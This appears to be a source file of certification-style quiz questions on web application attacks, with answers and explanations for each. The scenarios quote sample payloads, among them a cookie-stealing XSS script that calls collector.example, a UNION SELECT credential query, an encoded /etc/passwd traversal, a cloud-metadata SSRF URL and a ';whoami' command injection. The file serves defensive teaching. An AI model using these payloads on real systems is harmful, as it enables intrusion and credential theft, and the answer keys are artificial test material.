import { q, tf } from "./helpers";

// Web application attacks — heavy coverage because these are seeded weak areas.
// Several questions per concept, each with a different scenario.
export const webAttackQuestions = [
  // ---------- XSS ----------
  q({
    id: "web-xss-001",
    conceptIds: ["xss"],
    difficulty: "exam",
    scenario:
      "Users report that after viewing a product review page, their accounts are later used from unfamiliar locations. A review stored in the database contains:\n<script>new Image().src='https://collector.example/c?'+document.cookie</script>",
    stem: "Which attack is MOST likely taking place?",
    options: ["Stored cross-site scripting", "SQL injection", "Cross-site request forgery", "Directory traversal"],
    correct: ["a"],
    explanation:
      "The script is saved on the site and runs in every viewer's browser, sending their cookies to the attacker. That is stored (persistent) XSS.",
    why: {
      b: "SQL injection manipulates a database query. Here the database only stores the payload; it executes in browsers.",
      c: "CSRF forces a browser to send a request. It doesn't plant script that reads cookies.",
      d: "Directory traversal reads server files with ../ paths. Nothing here touches the file system.",
    },
  }),
  q({
    id: "web-xss-002",
    conceptIds: ["xss"],
    difficulty: "intermediate",
    scenario:
      "A developer is fixing a comment feature. Testers showed that a comment containing <img src=x onerror=alert(1)> triggers a pop-up for every visitor.",
    stem: "Which control BEST prevents this issue?",
    options: [
      "Context-aware output encoding of user-supplied content",
      "Parameterized database queries",
      "Anti-CSRF tokens on the comment form",
      "Account lockout after failed logins",
    ],
    correct: ["a"],
    explanation:
      "This is XSS. Encoding user content when it is written into the page makes the browser display it as text instead of running it.",
    why: {
      b: "Parameterized queries stop SQL injection. The payload here runs in the browser, not the database.",
      c: "Anti-CSRF tokens stop forged requests. They don't stop injected script from executing.",
      d: "Account lockout slows password guessing and has nothing to do with script injection.",
    },
  }),
  q({
    id: "web-xss-003",
    conceptIds: ["xss", "phishing"],
    difficulty: "exam",
    scenario:
      "An employee clicks an emailed link to https://shop.example.com/search?q=%3Cscript%20src%3Dhttps%3A%2F%2Fcdn-evil.example%2Fx.js%3E%3C%2Fscript%3E. The legitimate site's results page displays 'You searched for:' followed by the query, and the external script runs.",
    stem: "Which BEST describes this attack?",
    options: ["Reflected cross-site scripting", "Stored cross-site scripting", "Server-side request forgery", "Pharming"],
    correct: ["a"],
    explanation:
      "The payload is in the URL and is echoed straight back in the response, so it runs only for the person who clicks the crafted link. That is reflected XSS.",
    why: {
      b: "Stored XSS saves the payload on the server for every visitor. Here it only exists in the link.",
      c: "SSRF makes the server send requests. Here the victim's browser loads the script.",
      d: "Pharming redirects a correctly typed domain to a fake site. The user reached the real site.",
    },
  }),

  // ---------- SQL injection ----------
  q({
    id: "web-sqli-001",
    conceptIds: ["sqli"],
    difficulty: "intermediate",
    scenario:
      "A web server log contains:\nGET /products?id=10' UNION SELECT username,password FROM users-- HTTP/1.1  200",
    stem: "Which attack is MOST likely being attempted?",
    options: ["SQL injection", "Cross-site scripting", "Directory traversal", "Command injection"],
    correct: ["a"],
    explanation:
      "The quote closes the original value, UNION SELECT pulls data from another table, and -- comments out the rest. These are classic SQL injection markers.",
    why: {
      b: "XSS payloads contain HTML or JavaScript such as <script>. This is SQL syntax.",
      c: "Directory traversal uses ../ path sequences.",
      d: "Command injection appends shell operators such as ; or && with OS commands.",
    },
  }),
  q({
    id: "web-sqli-002",
    conceptIds: ["sqli"],
    difficulty: "exam",
    scenario:
      "A code review finds this line in a customer portal:\nquery = \"SELECT * FROM accounts WHERE email = '\" + request.email + \"'\"",
    stem: "Which remediation is MOST effective?",
    options: [
      "Rewrite the query using parameterized statements",
      "Place a web application firewall in front of the portal",
      "Encrypt the accounts table at rest",
      "HTML-encode the email value before displaying it",
    ],
    correct: ["a"],
    explanation:
      "Concatenating input into SQL causes injection. Parameterized queries keep data separate from the query structure, which fixes the root cause.",
    why: {
      b: "A WAF can block some attacks, but it is a compensating layer that can be bypassed. The code is still vulnerable.",
      c: "Encryption at rest protects stolen disks, not queries the app itself runs.",
      d: "HTML encoding defends against XSS on output. It doesn't change how the SQL is built.",
    },
  }),
  q({
    id: "web-sqli-xss-001",
    conceptIds: ["sqli", "xss"],
    difficulty: "exam",
    stem: "Which TWO statements describe SQL injection rather than cross-site scripting? (Select TWO)",
    options: [
      "The malicious input executes as part of a back-end database query",
      "The malicious input executes in another user's web browser",
      "Parameterized queries are the primary defense",
      "It is commonly used to read document.cookie from victims",
      "A Content Security Policy is a primary defense",
    ],
    correct: ["a", "c"],
    explanation:
      "SQL injection runs on the server against the database and is fixed with parameterized queries. XSS runs in the victim's browser and is defended with output encoding and CSP.",
    why: {
      b: "Running in a victim's browser is the defining trait of XSS.",
      d: "Stealing document.cookie is a typical XSS goal, since it requires script in the browser.",
      e: "CSP limits which scripts a browser will run, so it defends against XSS.",
    },
  }),

  // ---------- CSRF ----------
  q({
    id: "web-csrf-001",
    conceptIds: ["csrf"],
    difficulty: "exam",
    scenario:
      "An employee logged in to the internal HR portal visits a hobby forum during lunch. Later, their direct-deposit bank account in the HR portal has been changed. The forum page contains a hidden form that automatically POSTs to https://hr.corp.example/updateBank. The attacker never obtained the employee's password or cookie.",
    stem: "Which attack occurred?",
    options: ["Cross-site request forgery", "Session hijacking", "Stored cross-site scripting", "Server-side request forgery"],
    correct: ["a"],
    explanation:
      "The victim's own browser sent the request, and it automatically attached the HR portal cookie. The portal trusted it. That is CSRF.",
    why: {
      b: "Session hijacking requires the attacker to obtain and reuse the session token. The scenario says they never did.",
      c: "No script was injected into the HR portal. The malicious form lived on a different site.",
      d: "In SSRF the server makes the request. Here the employee's browser did.",
    },
  }),
  q({
    id: "web-csrf-002",
    conceptIds: ["csrf"],
    difficulty: "intermediate",
    stem: "Which control BEST prevents cross-site request forgery against a web application's 'change email address' form?",
    options: [
      "A unique, unpredictable anti-CSRF token validated by the server for each form submission",
      "Limiting the length of the email field",
      "Storing passwords as salted hashes",
      "Disabling directory listing on the web server",
    ],
    correct: ["a"],
    explanation:
      "An attacker's page can't read the secret token, so a forged request arrives without a valid token and is rejected. SameSite cookies and re-authentication add further protection.",
    why: {
      b: "Field length limits don't stop a well-formed forged request.",
      c: "Salted hashing protects stored passwords. CSRF never needs the password.",
      d: "Directory listing is unrelated to forged state-changing requests.",
    },
  }),

  // ---------- SSRF ----------
  q({
    id: "web-ssrf-001",
    conceptIds: ["ssrf"],
    difficulty: "exam",
    scenario:
      "A cloud-hosted app lets users import a profile picture by entering a URL. Logs show the web server making requests to http://169.254.169.254/latest/meta-data/iam/security-credentials/ after a user submitted that address.",
    stem: "Which attack is MOST likely occurring?",
    options: ["Server-side request forgery", "Cross-site request forgery", "Directory traversal", "On-path attack"],
    correct: ["a"],
    explanation:
      "The attacker made the server fetch an internal cloud metadata address that only the server can reach. That is SSRF, and it can expose temporary cloud credentials.",
    why: {
      b: "CSRF uses the victim's browser. Here the request comes from the server.",
      c: "Traversal reads files with ../ paths. This is a network request to an internal IP.",
      d: "Nothing intercepts traffic between two parties. The server was tricked into making the request.",
    },
  }),
  q({
    id: "web-ssrf-002",
    conceptIds: ["ssrf"],
    difficulty: "exam",
    stem: "A developer must keep a 'fetch link preview' feature that retrieves user-supplied URLs. Which control BEST reduces the risk of SSRF?",
    options: [
      "Allow only approved destinations and block internal, loopback, and link-local address ranges",
      "Set the SameSite attribute on session cookies",
      "Move the queries into stored procedures",
      "Require users to create longer passwords",
    ],
    correct: ["a"],
    explanation:
      "SSRF is dangerous when the server can be steered to internal targets. Restricting destinations, including checking where the name resolves, removes that ability.",
    why: {
      b: "SameSite cookies help against CSRF, which is a browser-side issue.",
      c: "Stored procedures relate to SQL injection.",
      d: "Password length doesn't limit where the server sends requests.",
    },
  }),
  q({
    id: "web-csrf-ssrf-001",
    conceptIds: ["csrf", "ssrf"],
    difficulty: "exam",
    stem: "A security lead is explaining the two 'request forgery' attacks to developers. Which statement is accurate?",
    options: [
      "SSRF makes the server send requests the attacker chooses. CSRF makes an authenticated user's browser send requests the user didn't intend.",
      "CSRF makes the server request internal resources. SSRF makes the user's browser submit forms.",
      "Both attacks require the attacker to steal the victim's session cookie first.",
      "Both attacks are prevented primarily by parameterized queries.",
    ],
    correct: ["a"],
    explanation:
      "Ask whose machine sends the forged request: the server (SSRF) or the victim's browser (CSRF).",
    why: {
      b: "This swaps the two definitions.",
      c: "Neither requires stealing the cookie. CSRF relies on the browser attaching it automatically, and SSRF relies on the server's network position.",
      d: "Parameterized queries address SQL injection, not request forgery.",
    },
  }),

  // ---------- Session hijacking ----------
  q({
    id: "web-session-001",
    conceptIds: ["session-hijacking"],
    difficulty: "exam",
    scenario:
      "A web app uses HTTPS for its login page but switches to plain HTTP afterward. A user works from a hotel's open Wi-Fi. Later, the app logs show the user's session ID in use from two different IP addresses at the same time. The attacker never entered a password.",
    stem: "Which attack BEST explains this?",
    options: ["Session hijacking", "Credential stuffing", "Cross-site request forgery", "Password spraying"],
    correct: ["a"],
    explanation:
      "The session cookie travelled unencrypted after login, so it could be captured and reused. Reusing a valid session token is session hijacking.",
    why: {
      b: "Credential stuffing logs in with leaked passwords. No password was used.",
      c: "In CSRF the attacker never holds the token. Here the token is being used from the attacker's own IP.",
      d: "Password spraying guesses common passwords. No login took place.",
    },
  }),
  q({
    id: "web-session-002",
    conceptIds: ["session-hijacking", "broken-authentication"],
    difficulty: "exam",
    stem: "Which TWO controls MOST directly reduce the risk of session tokens being stolen and reused? (Select TWO)",
    options: [
      "Set the Secure and HttpOnly flags on the session cookie",
      "Regenerate the session ID at login and invalidate it at logout",
      "Increase the minimum password length to 14 characters",
      "Require password changes every 30 days",
      "Disable directory browsing on the web server",
    ],
    correct: ["a", "b"],
    explanation:
      "Secure keeps the cookie off unencrypted connections, and HttpOnly stops scripts from reading it. Regenerating and invalidating IDs limits how long a stolen token is useful.",
    why: {
      c: "Stronger passwords don't help once a valid session token is stolen.",
      d: "Password rotation doesn't invalidate a token that's already been captured.",
      e: "Directory browsing is unrelated to session tokens.",
    },
  }),
  tf({
    id: "web-session-tf-001",
    conceptIds: ["session-hijacking", "on-path"],
    difficulty: "intermediate",
    stem: "True or false: Session hijacking always requires the attacker to be in an on-path position between the victim and the server.",
    answer: false,
    explanation:
      "False. An on-path position is one way to capture tokens. Tokens can also be stolen through XSS, malware, predictable session IDs, or logs that contain them.",
    why: {
      a: "XSS can read a non-HttpOnly cookie and send it to the attacker without any on-path position.",
    },
  }),

  // ---------- Broken authentication ----------
  q({
    id: "web-brokenauth-001",
    conceptIds: ["broken-authentication"],
    difficulty: "intermediate",
    scenario:
      "Penetration test findings for a web portal:\n• Unlimited login attempts are allowed\n• Session IDs remain valid after the user logs out\n• Password reset links never expire",
    stem: "Which vulnerability category BEST describes these findings?",
    options: ["Broken authentication", "SQL injection", "Race condition", "Directory traversal"],
    correct: ["a"],
    explanation:
      "All three are weaknesses in how the app verifies identity and manages sessions. Together they make account takeover easier.",
    why: {
      b: "No query manipulation is described.",
      c: "A race condition depends on timing between a check and a use. None is described.",
      d: "No file path manipulation is described.",
    },
  }),
  q({
    id: "web-brokenauth-002",
    conceptIds: ["broken-authentication", "mfa"],
    difficulty: "exam",
    scenario:
      "A customer portal accepts any password of six or more characters, has no lockout or throttling, and uses only a username and password. Automated login attacks against it are increasing.",
    stem: "Which change would provide the GREATEST reduction in successful account takeovers?",
    options: [
      "Require multifactor authentication",
      "Lengthen the session timeout",
      "Change usernames from email addresses to employee numbers",
      "Move the login page to a different URL",
    ],
    correct: ["a"],
    explanation:
      "With MFA, a correct password alone is no longer enough. That blocks most automated takeover attempts even if passwords are guessed or reused.",
    why: {
      b: "A longer session timeout increases exposure. It doesn't reduce it.",
      c: "Changing username format is obscurity and attackers can usually enumerate the new format.",
      d: "Moving the login page is security through obscurity. Bots will find it.",
    },
  }),

  // ---------- Directory traversal ----------
  q({
    id: "web-traversal-001",
    conceptIds: ["directory-traversal"],
    difficulty: "intermediate",
    scenario: "A web access log shows:\nGET /view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd  200 1843",
    stem: "Which attack does this entry indicate?",
    options: ["Directory traversal", "SQL injection", "Cross-site scripting", "Server-side request forgery"],
    correct: ["a"],
    explanation:
      "%2F is an encoded slash, so the request is ../../../../etc/passwd. It climbs out of the web folder to read a system file. The 200 status suggests it worked.",
    why: {
      b: "There is no SQL syntax such as quotes, OR 1=1, or UNION.",
      c: "There is no script or HTML in the parameter.",
      d: "SSRF would make the server call a URL or IP. This is a local file path.",
    },
  }),
  q({
    id: "web-traversal-002",
    conceptIds: ["directory-traversal"],
    difficulty: "exam",
    stem: "A download endpoint takes a filename parameter. Which developer change BEST prevents directory traversal?",
    options: [
      "Resolve the requested path to its canonical form and reject it unless it is inside the allowed directory",
      "URL-encode the filename parameter before processing it",
      "Add anti-CSRF tokens to the download link",
      "Run the web server on a non-standard port",
    ],
    correct: ["a"],
    explanation:
      "Canonicalizing first removes encoded and ../ tricks, and checking the result against the allowed base folder blocks any escape. An allow-list of file IDs is even stronger.",
    why: {
      b: "Encoding doesn't stop traversal. Attackers already use encoded forms like %2e%2e%2f.",
      c: "CSRF tokens stop forged requests, not path manipulation.",
      d: "Changing the port is obscurity and doesn't affect file access logic.",
    },
  }),
  q({
    id: "web-idor-001",
    conceptIds: ["idor", "directory-traversal"],
    difficulty: "intermediate",
    scenario:
      "A customer viewing https://store.example/api/orders/58213 changes the number to 58214 and receives another customer's order, including their address.",
    stem: "Which vulnerability is this?",
    options: [
      "Insecure direct object reference",
      "Directory traversal",
      "Server-side request forgery",
      "Session hijacking",
    ],
    correct: ["a"],
    explanation:
      "The app trusts the object ID and never checks whether the logged-in user owns order 58214. That is IDOR, a broken access control flaw.",
    why: {
      b: "Traversal manipulates file paths with ../. Here only a record ID changed.",
      c: "The server isn't being steered to another host.",
      d: "The customer used their own session. They didn't steal someone else's.",
    },
  }),

  // ---------- RCE ----------
  q({
    id: "web-rce-001",
    conceptIds: ["rce"],
    difficulty: "intermediate",
    scenario:
      "A vendor advisory states: 'An unauthenticated attacker can send a crafted serialized object to the application server's API, resulting in execution of arbitrary commands with the privileges of the service account.'",
    stem: "Which term BEST describes this vulnerability?",
    options: ["Remote code execution", "Cross-site scripting", "Race condition", "Privilege escalation through a local account"],
    correct: ["a"],
    explanation:
      "Arbitrary code execution triggered over the network without authentication is RCE. The insecure deserialization is the cause.",
    why: {
      b: "XSS runs script in a user's browser, not commands on the server.",
      c: "Nothing depends on timing between a check and a use.",
      d: "No local foothold is needed. The attacker is remote and unauthenticated.",
    },
  }),
  q({
    id: "web-rce-002",
    conceptIds: ["rce", "vulnerability-scanning"],
    difficulty: "exam",
    scenario:
      "A vulnerability scan returns three findings:\n1. Remote code execution in the internet-facing VPN appliance (CVSS 9.8, exploitation reported in the wild)\n2. Reflected XSS on an internal wiki (CVSS 6.1)\n3. Weak TLS cipher suites enabled on a network printer (CVSS 3.7)",
    stem: "Which finding should be remediated FIRST?",
    options: [
      "The VPN appliance RCE",
      "The internal wiki XSS",
      "The printer TLS configuration",
      "All three together in the next quarterly maintenance window",
    ],
    correct: ["a"],
    explanation:
      "It has critical severity, is exposed to the internet, and is already being exploited. Those three factors make it the highest priority by a wide margin.",
    why: {
      b: "The wiki XSS matters but is internal and medium severity.",
      c: "Weak ciphers on a printer are low severity.",
      d: "Waiting for a quarterly window leaves an actively exploited, internet-facing RCE open.",
    },
  }),

  // ---------- Race conditions ----------
  q({
    id: "web-race-001",
    conceptIds: ["race-condition"],
    difficulty: "exam",
    scenario:
      "A $50 gift card was redeemed 20 times within one second. The redemption code checks the balance and then, in a separate step, deducts it. All 20 requests passed the balance check before any deduction was written.",
    stem: "Which vulnerability was exploited?",
    options: ["Race condition", "Replay attack", "Integer overflow", "Cross-site request forgery"],
    correct: ["a"],
    explanation:
      "The attacker exploited the gap between checking the balance and using it (time-of-check to time-of-use). This is a race condition.",
    why: {
      b: "A replay resends a captured request later. Here the flaw is concurrent requests landing in a timing gap.",
      c: "Nothing suggests a number wrapped past its maximum value.",
      d: "The redeemer sent the requests themselves. No victim's browser was tricked.",
    },
  }),
  q({
    id: "web-race-002",
    conceptIds: ["race-condition"],
    difficulty: "advanced",
    scenario:
      "A privileged utility checks that /tmp/report.txt is owned by the calling user, then opens the file and writes to it. An attacker replaces the file with a symbolic link to /etc/shadow between the check and the open.",
    stem: "Which BEST describes this vulnerability?",
    options: ["Time-of-check to time-of-use (TOCTOU)", "Directory traversal", "Buffer overflow", "Memory injection"],
    correct: ["a"],
    explanation:
      "The file's state changed after it was checked but before it was used. That is the defining pattern of a TOCTOU race condition.",
    why: {
      b: "No ../ path sequences are used. A symlink is swapped in during a timing gap.",
      c: "No data is written beyond a memory buffer.",
      d: "No code is injected into a process's memory.",
    },
  }),
  q({
    id: "web-race-003",
    conceptIds: ["race-condition"],
    difficulty: "exam",
    stem: "A loyalty-points app lets users redeem the same points several times by sending requests at the same moment. Which fix BEST addresses the root cause?",
    options: [
      "Perform the balance check and deduction in one atomic transaction with appropriate locking",
      "Add a CAPTCHA to the redemption page",
      "Encrypt the points balance in the database",
      "Log every redemption for later review",
    ],
    correct: ["a"],
    explanation:
      "If the check and update happen as one indivisible step, no second request can slip in between them.",
    why: {
      b: "A CAPTCHA slows automation, but two requests sent at once can still race.",
      c: "Encryption protects confidentiality and doesn't change the timing gap.",
      d: "Logging is detective. It records the abuse but doesn't prevent it.",
    },
  }),

  // ---------- On-path ----------
  q({
    id: "web-onpath-001",
    conceptIds: ["on-path", "spoofing"],
    difficulty: "exam",
    scenario:
      "Guests on a conference Wi-Fi network report certificate warnings on many sites. A technician sees that the default gateway's IP address maps to the MAC address of another guest's laptop in several clients' ARP caches.",
    stem: "Which attack is MOST likely taking place?",
    options: [
      "An on-path attack using ARP poisoning",
      "Pharming through modified hosts files",
      "Credential stuffing",
      "Wireless jamming",
    ],
    correct: ["a"],
    explanation:
      "Poisoned ARP caches send traffic through the attacker's laptop, putting it in the middle. The certificate warnings appear because the attacker can't present valid certificates for the real sites.",
    why: {
      b: "Pharming changes name resolution. The evidence here is a wrong MAC address for the gateway.",
      c: "Credential stuffing is a login attack and doesn't change ARP tables.",
      d: "Jamming disrupts the radio signal. Clients are connected, just through the wrong device.",
    },
  }),
  q({
    id: "web-onpath-002",
    conceptIds: ["on-path"],
    difficulty: "intermediate",
    stem: "Sales staff often work from hotel and airport networks. Which control BEST protects their traffic from on-path attackers on those networks?",
    options: [
      "An always-on VPN that validates the server certificate",
      "A longer password policy",
      "Full-disk encryption on laptops",
      "Privacy screen filters",
    ],
    correct: ["a"],
    explanation:
      "An authenticated, encrypted tunnel means anyone sitting in the path sees only ciphertext, and the certificate check stops them from impersonating the VPN server.",
    why: {
      b: "Longer passwords don't protect data in transit.",
      c: "Full-disk encryption protects data at rest if the laptop is stolen.",
      d: "Privacy filters stop shoulder surfing, not network interception.",
    },
  }),

  // ---------- Differentiation ----------
  q({
    id: "web-xss-csrf-001",
    conceptIds: ["xss", "csrf"],
    difficulty: "advanced",
    scenario:
      "Two incidents both changed a victim's account email:\n• Incident A: The attacker's own website silently submitted a form to the target site. The victim's browser attached its existing session cookie.\n• Incident B: The attacker posted a comment on the target site containing script. When the victim viewed it, the script read the page's anti-CSRF token and submitted the change.",
    stem: "Which option correctly identifies the two attacks?",
    options: [
      "A is CSRF. B is cross-site scripting.",
      "A is cross-site scripting. B is CSRF.",
      "Both are CSRF.",
      "A is SSRF. B is SQL injection.",
    ],
    correct: ["a"],
    explanation:
      "A used only the browser's automatic cookie, which is CSRF. B ran injected script inside the target site, which is XSS. XSS can defeat anti-CSRF tokens because the script runs on the same origin and can read them.",
    why: {
      b: "This reverses them. No script ran on the target site in A.",
      c: "B depends on injected script running on the target site, which makes it XSS.",
      d: "No server-originated request or database query manipulation is described.",
    },
  }),
  q({
    id: "web-cmdi-001",
    conceptIds: ["command-injection"],
    difficulty: "intermediate",
    scenario: "A network diagnostics page logs this request:\nPOST /tools/ping  host=10.0.0.5;whoami",
    stem: "Which attack is being attempted?",
    options: ["Command injection", "SQL injection", "Cross-site scripting", "LDAP injection"],
    correct: ["a"],
    explanation: "The semicolon ends the ping command and starts a new OS command (whoami). That is command injection.",
    why: {
      b: "There is no SQL syntax.",
      c: "There is no script or HTML.",
      d: "LDAP injection uses directory filter syntax such as *)(uid=*.",
    },
  }),
];
